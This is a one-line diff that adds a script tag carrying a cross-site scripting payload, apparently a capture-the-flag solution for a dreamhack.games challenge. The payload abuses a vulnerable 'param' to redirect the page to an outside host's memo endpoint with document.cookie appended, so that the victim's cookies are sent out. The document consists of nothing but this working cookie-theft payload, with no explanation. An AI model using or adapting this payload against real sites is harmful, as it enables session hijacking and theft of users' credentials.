@@ -1,0 +1,1 @@
+<script src="/vuln?param=document.location='http://host3.dreamhack.games:12499/memo?memo='%252Bdocument.cookie;"></script>
